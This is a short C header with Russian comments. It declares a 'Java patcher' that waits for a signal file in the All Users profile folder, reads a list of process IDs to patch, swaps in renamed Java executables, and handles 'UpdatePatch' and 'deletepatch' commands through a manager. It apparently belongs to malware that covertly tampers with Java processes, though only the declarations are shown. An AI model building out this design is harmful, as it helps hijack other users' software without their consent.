#ifndef		JAVS_PATCHERH
#define		JAVS_PATCHERH

#include "windows.h"

const char* GetJREPath();
const char UpdatePath[] = "UpdatePatch\0";
const char DeletePath[] = "deletepatch\0";

// Имя сигнального файла. Файл должен находиться в профильной
// директории всех пользователей (WIN 7 -  c:\Users\All Users\
// как только в нужном месте появися файл с нужным именем запустится
// работа патча
const char JavaPatcherSignalFile[] = "Pat.txt";


// Имя файла куда записываются пиды процессов для которых
// необходимо поставить патч
const char JavaPatcherPidsFile[] = "wj.dat";


// Имена пропатченных ехе
const char Patched_Jawa_Name[]  = "javao.exe";
const char Patched_JawaW_Name[] = "javawo.exe";


bool ExecuteUpdatePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);
bool ExecuteDeletePathCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

bool WINAPI ClearAndDel( LPVOID lpData );

DWORD WINAPI Run_Path(LPVOID lpData);

//-------------------------------------------------------------
// JavaPatcherSignal - Функция сигнализирует о необходимости
//                     запуска патчей
//-------------------------------------------------------------
void  JavaPatcherSignal();

#endif		//java_patcher
